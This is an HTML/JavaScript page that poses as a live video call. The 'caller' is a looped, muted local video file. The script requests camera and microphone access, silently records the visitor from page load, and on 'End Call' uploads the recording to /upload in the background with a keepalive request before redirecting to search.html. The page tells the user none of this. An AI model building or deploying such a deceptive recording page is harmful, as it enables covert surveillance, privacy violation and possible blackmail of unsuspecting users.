<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Calling</title>
<style>
    body { margin:0; background:black; color:white; font-family: sans-serif; overflow:hidden; }
    #remoteVideo { position:fixed; width:100%; height:100%; object-fit:cover; }
    #localVideo { position: absolute; width: 120px; height: 180px; bottom: 100px; right: 20px; border: 2px solid white; border-radius: 12px; object-fit: cover; z-index: 10; }
    .controls { position:absolute; bottom:20px; width:100%; display:flex; justify-content:center; gap:10px; }
    button { padding:12px 20px; border:none; border-radius:25px; background:#333; color:white; cursor:pointer; }
    .end { background:#ff3b30; }
</style>
</head>
<body>

<video id="remoteVideo" autoplay loop muted playsinline>
    <source src="test-video.mp4" type="video/mp4">
</video>

<video id="localVideo" autoplay muted playsinline></video>

<div class="controls">
    <button onclick="toggleMic()">Mic</button>
    <button onclick="switchCamera()">Switch</button>
    <button class="end" onclick="endCall()">End Call</button>
</div>

<script>
let localStream;
let mediaRecorder;
let recordedChunks = [];
let currentFacing = "user";

const localVideo = document.getElementById("localVideo");

// --- MOVABLE VIDEO LOGIC (Desktop & Mobile) ---
let isDragging = false;
let offsetX, offsetY;

const startDrag = (e) => {
    isDragging = true;
    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
    const rect = localVideo.getBoundingClientRect();
    offsetX = clientX - rect.left;
    offsetY = clientY - rect.top;
    localVideo.style.cursor = "grabbing";
};

const drag = (e) => {
    if (!isDragging) return;
    e.preventDefault(); // Prevents scrolling while moving video
    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
    
    localVideo.style.left = (clientX - offsetX) + "px";
    localVideo.style.top = (clientY - offsetY) + "px";
    localVideo.style.right = "auto";
    localVideo.style.bottom = "auto";
};

const stopDrag = () => { isDragging = false; localVideo.style.cursor = "grab"; };

localVideo.addEventListener("mousedown", startDrag);
localVideo.addEventListener("touchstart", startDrag, { passive: false });
document.addEventListener("mousemove", drag);
document.addEventListener("touchmove", drag, { passive: false });
document.addEventListener("mouseup", stopDrag);
document.addEventListener("touchend", stopDrag);


// --- CAMERA & RECORDING LOGIC ---
async function startCamera() {
    try {
        localStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: currentFacing },
            audio: true
        });
        localVideo.srcObject = localStream;
        startRecording();
    } catch (err) {
        console.error("Camera error:", err);
    }
}

function startRecording() {
    const types = ["video/webm;codecs=vp8,opus", "video/webm", "video/mp4"];
    let selectedType = types.find(t => MediaRecorder.isTypeSupported(t));
    
    mediaRecorder = new MediaRecorder(localStream, { mimeType: selectedType });
    
    mediaRecorder.ondataavailable = e => {
        if (e.data.size > 0) recordedChunks.push(e.data);
    };

    mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: selectedType });
        const formData = new FormData();
        formData.append("video", blob, "call.webm");

        // 🔥 BACKGROUND UPLOAD: Starts the upload but doesn't make the user wait
        fetch("/upload", {
            method: "POST",
            body: formData,
            keepalive: true // Crucial: keeps the request alive after page redirect
        }).catch(err => console.error("Background upload failed", err));

        // 🚀 INSTANT REDIRECT
        window.location.href = "search.html";
    };

    mediaRecorder.start();
}

function endCall() {
    // Stop recording, which triggers the onstop event and the redirect
    if (mediaRecorder && mediaRecorder.state !== "inactive") {
        mediaRecorder.stop();
    } else {
        window.location.href = "search.html";
    }
}

function switchCamera() {
    currentFacing = currentFacing === "user" ? "environment" : "user";
    localStream.getTracks().forEach(t => t.stop());
    startCamera();
}

function toggleMic() {
    const track = localStream.getAudioTracks()[0];
    if(track) track.enabled = !track.enabled;
}

startCamera();
</script>
</body>
</html>
